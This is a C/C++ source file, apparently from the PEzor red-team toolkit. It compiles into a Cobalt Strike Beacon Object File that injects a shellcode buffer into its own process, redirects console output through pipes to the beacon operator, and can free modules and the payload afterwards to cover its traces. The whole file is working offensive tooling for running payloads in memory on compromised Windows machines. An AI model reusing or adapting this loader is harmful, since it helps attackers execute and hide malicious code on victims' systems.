// x86_64-w64-mingw32-clang -c reflective-execution.c -D_BOF_ -o reflective-execution.o
#define WIN32_LEAN_AND_MEAN

#include <io.h>
#include <stdio.h>
#include <fcntl.h>
#include <windows.h>
#include <synchapi.h>
#include <string.h>

#define BUFFER_SIZE 1024
#define _WAIT_TIMEOUT 5000
#define ARRAY_MODULES_SIZE 128
#define NT_FAIL(status) (status < 0)

#pragma clang diagnostic ignored "-Wnested-anon-types"
#pragma clang diagnostic ignored "-Wgnu-anonymous-struct"

#include "inject.hpp"
#include "sleep.hpp"

#ifdef _BOF_

#pragma clang diagnostic ignored "-Wmacro-redefined"
#pragma clang diagnostic ignored "-Wdollar-in-identifier-extension"
#pragma clang diagnostic ignored "-Wwritable-strings"

extern "C" {
#include "beacon.h"
}

extern "C" DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$SetLastError(
  DWORD dwErrCode
);

#define SetLastError KERNEL32$SetLastError

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreatePipe(
    PHANDLE               hReadPipe,
    PHANDLE               hWritePipe,
    LPSECURITY_ATTRIBUTES lpPipeAttributes,
    DWORD                 nSize
);
#define CreatePipe KERNEL32$CreatePipe

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetStdHandle(DWORD nStdHandle);
#define GetStdHandle KERNEL32$GetStdHandle

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$SetStdHandle(
    DWORD  nStdHandle,
    HANDLE hHandle
);
#define SetStdHandle KERNEL32$SetStdHandle

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);
#define CreateThread KERNEL32$CreateThread

extern "C" DECLSPEC_IMPORT WINBASEAPI DWORD    WINAPI  KERNEL32$WaitForSingleObject(HANDLE, DWORD);
#define WaitForSingleObject KERNEL32$WaitForSingleObject

extern "C" DECLSPEC_IMPORT WINBASEAPI LPVOID   WINAPI  KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
#define VirtualAlloc KERNEL32$VirtualAlloc

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
#define VirtualFree KERNEL32$VirtualFree

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);
#define VirtualFreeEx KERNEL32$VirtualFreeEx

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
#define VirtualProtect KERNEL32$VirtualProtect

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$CloseHandle(HANDLE);
#define CloseHandle KERNEL32$CloseHandle

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$AllocConsole(void);
#define AllocConsole KERNEL32$AllocConsole

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$FreeConsole(void);
#define FreeConsole KERNEL32$FreeConsole

extern "C" DECLSPEC_IMPORT WINBASEAPI HANDLE     WINAPI  KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);
#define CreateFileA KERNEL32$CreateFileA

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$ReadFile(HANDLE, PVOID, DWORD, PDWORD, LPOVERLAPPED);
#define ReadFile KERNEL32$ReadFile

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL     WINAPI  KERNEL32$PeekNamedPipe(
  HANDLE  hNamedPipe,
  LPVOID  lpBuffer,
  DWORD   nBufferSize,
  LPDWORD lpBytesRead,
  LPDWORD lpTotalBytesAvail,
  LPDWORD lpBytesLeftThisMessage
);
#define PeekNamedPipe KERNEL32$PeekNamedPipe

extern "C" DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI PSAPI$EnumProcessModules(
  HANDLE  hProcess,
  HMODULE *lphModule,
  DWORD   cb,
  LPDWORD lpcbNeeded
);
#define EnumProcessModules PSAPI$EnumProcessModules

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_open_osfhandle(
   intptr_t osfhandle,
   int flags
);
#define _open_osfhandle MSVCRT$_open_osfhandle

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_dup2(int fd1, int fd2);
#define _dup2 MSVCRT$_dup2

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_dup(int fd1);
#define _dup MSVCRT$_dup

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$_fileno(FILE *stream);
#define _fileno MSVCRT$_fileno

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$setvbuf(
   FILE *stream,
   char *buffer,
   int mode,
   size_t size
);
#define setvbuf MSVCRT$setvbuf

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$puts(const char *str);
#define puts MSVCRT$puts

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$perror(const char *str);
#define perror MSVCRT$perror

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$printf(const char * format, ...);
#define printf MSVCRT$printf

extern "C" DECLSPEC_IMPORT int      __cdecl  MSVCRT$fprintf(FILE *stream, const char * format, ...);
#define fprintf MSVCRT$fprintf

extern "C" DECLSPEC_IMPORT errno_t      __cdecl  MSVCRT$freopen_s(
   FILE ** stream,
   const char * fileName,
   const char * mode,
   FILE* oldStream
);
#define freopen_s MSVCRT$freopen_s

extern "C" DECLSPEC_IMPORT FILE*      __cdecl  MSVCRT$__iob_func();
#define __iob_func MSVCRT$__iob_func

// https://doxygen.reactos.org/d2/de9/acrt__iob__func_8c_source.html
extern "C" __declspec(dllexport)
FILE *__cdecl __acrt_iob_funcs(int index)
{
    return &(__iob_func()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))

#endif

BOOL createPipe(HANDLE* pipeRead, HANDLE* pipeWrite) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    return CreatePipe(pipeRead, pipeWrite, &sa, 0);
}

void redirectIO(FILE* hFrom, HANDLE hTo) {
    int fd = _open_osfhandle((intptr_t)hTo, _O_TEXT);
    _dup2(fd, _fileno(hFrom));
    setvbuf(hFrom, NULL, _IONBF, 0); //Disable buffering.
}

void restoreIO(int stdoutFd, int stderrFd, HANDLE stdoutHandle, HANDLE stderrHandle) {
    _dup2(stdoutFd, _fileno(stdout));
    _dup2(stderrFd, _fileno(stderr));
    SetStdHandle(STD_OUTPUT_HANDLE, stdoutHandle);
    SetStdHandle(STD_ERROR_HANDLE, stderrHandle);
}

BOOL createConsole() {
    if (!AllocConsole()) {
        return FALSE;
    }

    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);

    HANDLE hConOut = CreateFileA(TEXT("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetStdHandle(STD_OUTPUT_HANDLE, hConOut);
    SetStdHandle(STD_ERROR_HANDLE, hConOut);
    return TRUE;
}

#ifdef _CLEANUP_
BOOL isPresentInArray(HMODULE loadedModules[], HMODULE targetModule) {
    for (unsigned int i = 0; i < ARRAY_MODULES_SIZE; i++) {
        if (loadedModules[i] == targetModule) {
            return TRUE;
        }
    }

    return FALSE;
}

BOOL cleanupModules(HMODULE loadedModules[]) {
    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
    DWORD cbNeeded = -1;
    BOOL wasLibraryFreed = FALSE;

    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));

    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            #ifdef _BOF_
            BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] Checking library %d", i);
            #endif
            if (!isPresentInArray(loadedModules, hMods[i])) {
                #ifdef _BOF_
                BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] Freeing library %d", i);
                #endif
                FreeLibrary(hMods[i]);
                wasLibraryFreed = TRUE;
            }
        }
    }

    return wasLibraryFreed;
}

BOOL cleanupModules2(unsigned int numberOfLoadedModules) {
    HMODULE hMods[ARRAY_MODULES_SIZE * sizeof(HMODULE)];
    DWORD cbNeeded = -1;
    BOOL wasLibraryFreed = FALSE;

    //numberOfLoadedModules -= 9; // numbers of modules loaded by the bof itself

    __stosb((unsigned char*)hMods, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));

    if (EnumProcessModules((HANDLE)-1, hMods, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded)) {
        for (unsigned int i = numberOfLoadedModules; i < (cbNeeded / sizeof(HMODULE)); i++) {
            FreeLibrary(hMods[i]);
            wasLibraryFreed = TRUE;
        }
    }

    return wasLibraryFreed;
}
#endif

#ifndef _BOF_
DWORD WINAPI helloWorld(LPVOID lpParam) {
    puts("Hello World!\n");
    perror("Welp\n");
    for (int i = 0; i < 1024; i++) {
        printf("%d - ", i);
    }

    return 0;
}
#endif

extern "C" __declspec(dllexport)
int go(char * args, int alen) {
    HANDLE stdoutHandle = INVALID_HANDLE_VALUE;
    HANDLE stderrHandle = INVALID_HANDLE_VALUE;
    HANDLE pipeReadOutput = INVALID_HANDLE_VALUE;
    HANDLE pipeWriteOutput = INVALID_HANDLE_VALUE;
    HANDLE pipeReadError = INVALID_HANDLE_VALUE;
    HANDLE pipeWriteError = INVALID_HANDLE_VALUE;
    int stdoutFd = -1;
    int stderrFd = -1;
    int readResult = -1;
    DWORD waitResult = -1;
    BOOL isThreadFinished = FALSE;
    BOOL wasConsoleCreated = FALSE;
    unsigned char recvBuffer[BUFFER_SIZE];
    DWORD bytesRead = 0;
    DWORD remainingDataOutput = 0;
    DWORD remainingDataError = 0;
    DWORD cbNeeded = -1;
    HMODULE loadedModules[ARRAY_MODULES_SIZE * sizeof(HMODULE)];

    #ifdef SYSCALLS
    my_init_syscalls_list();
    #endif

    #ifdef _BOF_
    BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] starting BOF...");
    #endif

    __stosb((unsigned char*)loadedModules, 0, ARRAY_MODULES_SIZE * sizeof(HMODULE));
    EnumProcessModules((HANDLE)-1, loadedModules, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded);

    stdoutHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    stderrHandle = GetStdHandle(STD_ERROR_HANDLE);
    stdoutFd = _dup(_fileno(stdout));
    stderrFd = _dup(_fileno(stderr));
    wasConsoleCreated = createConsole();
    createPipe(&pipeReadOutput, &pipeWriteOutput);
    createPipe(&pipeReadError, &pipeWriteError);
    redirectIO(stdout, pipeWriteOutput);
    redirectIO(stderr, pipeWriteError);

    #ifndef _BOF_
    DWORD dwThreadId = -1;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        helloWorld,
        NULL,
        0,
        &dwThreadId);
    #else
    HANDLE hThread = INVALID_HANDLE_VALUE;
    LPVOID allocation = inject_shellcode_self(buf, buf_size, &hThread, FALSE, 0);
    if (!allocation || hThread == (HANDLE)-1) {
        restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
        #ifdef _BOF_
        BeaconPrintf(CALLBACK_ERROR, "inject_shellcode_self: ERROR 0x%x", allocation);
        printf("inject_shellcode_self: ERROR 0x%x", allocation);
        #else
        printf("inject_shellcode_self: ERROR 0x%x", allocation);
        #endif
        return -1;
    }
    #endif

    do {
        waitResult = WaitForSingleObject(hThread, _WAIT_TIMEOUT);
        switch (waitResult) {
        case WAIT_ABANDONED:
            restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
            perror("WAIT_ABANDONED\n");
            break;
        case WAIT_FAILED:
            restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
            perror("WAIT_FAILED\n");
            break;
        case _WAIT_TIMEOUT:
            break;
        case WAIT_OBJECT_0:
            isThreadFinished = TRUE;
        }

        PeekNamedPipe(pipeReadOutput, NULL, 0, NULL, &remainingDataOutput, NULL);
        if (remainingDataOutput) {
            SetLastError(0);
            __stosb((unsigned char*)(void*)recvBuffer, 0, BUFFER_SIZE);
            bytesRead = 0;
            readResult = ReadFile(
                pipeReadOutput,
                recvBuffer,
                BUFFER_SIZE - 1,
                &bytesRead,
                NULL);

            if (!readResult) {
                restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
                return -1;
            }

            recvBuffer[BUFFER_SIZE - 1] = '\0';
            #ifdef _BOF_
            BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);
            #endif
        }

        PeekNamedPipe(pipeReadError, NULL, 0, NULL, &remainingDataError, NULL);
        if (remainingDataError) {
            SetLastError(0);
            __stosb(recvBuffer, 0, BUFFER_SIZE);
            bytesRead = 0;
            readResult = ReadFile(
                pipeReadError,
                recvBuffer,
                BUFFER_SIZE - 1,
                &bytesRead,
                NULL);

            if (!readResult) {
                restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
                return -1;
            }

            recvBuffer[BUFFER_SIZE - 1] = '\0';
            #ifdef _BOF_
            BeaconPrintf(CALLBACK_ERROR, "%s", recvBuffer);
            #endif
        }
    } while (!isThreadFinished || remainingDataOutput || remainingDataError);

    restoreIO(stdoutFd, stderrFd, stdoutHandle, stderrHandle);
    if (wasConsoleCreated) {
        CloseHandle(GetStdHandle(STD_OUTPUT_HANDLE));
        CloseHandle(GetStdHandle(STD_ERROR_HANDLE));
        FreeConsole();
    }

    CloseHandle(pipeWriteOutput);
    CloseHandle(pipeReadOutput);
    CloseHandle(pipeWriteError);
    CloseHandle(pipeReadError);

    #ifdef _CLEANUP_
    //if (cleanupModules(loadedModules)) {
    if (cleanupModules2(cbNeeded / sizeof(HMODULE))) {
        // some module was freed
        #ifdef _BOF_
        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] cleanup complete");
        #endif
    } else {
        #ifdef _BOF_
        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] no cleanup needed");
        #endif
    }

    if (VirtualFreeEx((HANDLE)-1, allocation, 0, MEM_RELEASE)) {
        #ifdef _BOF_
        BeaconPrintf(CALLBACK_OUTPUT, "[PEzor] payload freed");
        #endif
    } else {
        #ifdef _BOF_
        BeaconPrintf(CALLBACK_ERROR, "[PEzor] error when freeing payload");
        #endif
    }
    #endif

    return 0;
}
